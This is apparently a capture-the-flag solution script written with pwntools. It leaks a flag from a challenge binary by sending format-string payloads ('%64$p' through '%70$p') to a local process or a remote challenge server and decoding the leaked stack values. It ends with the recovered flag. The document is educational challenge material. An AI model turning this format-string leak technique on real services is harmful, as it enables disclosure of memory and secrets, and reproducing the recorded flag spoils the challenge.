# Arch:       amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

from pwn import *

def conn(): 
    if args.GDB: 
        return gdb.debug(args.BINARY, 
        gdbscript="""
        continue
        """)
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process(args.BINARY)

def fuzz():
    for i in range(64, 71):
        p = conn()
        if args.REMOTE:
            p.sendline(b"13523090")
            p.sendline(b"4")
        
        p.sendline(f'%{i}$p'.encode())
        print(f"{i}: {p.recvline()}")
    
    p.close()

def unhex(hex_str):
    hex_str = hex_str[2:]
    reversed_hex = ''.join([hex_str[i:i+2] for i in range(0, len(hex_str), 2)][::-1])
    byte_data = bytes.fromhex(reversed_hex)
    return byte_data.decode('ascii', errors='ignore')

def solve(): 
    exe = './4'
    context.binary = ELF(exe, checksec=False)
    context.log_level = 'debug'

    # fuzzing
    fuzz()

    #64: b'0x447b336d6f6b724f'
    #65: b'0x726f772074276e6f'
    #66: b'0x6c6c2749202c7972'
    #67: b'0x79736165206f6720'
    #68: b'0x6563383662615f2e'
    #69: b'0x3633346234663861'
    #70: b'0x7d6536'

    # Attack goes here
    hex_strings = [
        '0x447b336d6f6b724f',
        '0x726f772074276e6f',
        '0x6c6c2749202c7972',
        '0x79736165206f6720',
        '0x6563383662615f2e',
        '0x3633346234663861',
        '0x7d6536'
    ]

    decoded_strings = [unhex(hex_str) for hex_str in hex_strings]

    combined_string = ''.join(decoded_strings)
    print(f"FLAG: {combined_string}")

solve()

# Orkom3{Don't worry, I'll go easy._ab68cea8f4b4366e}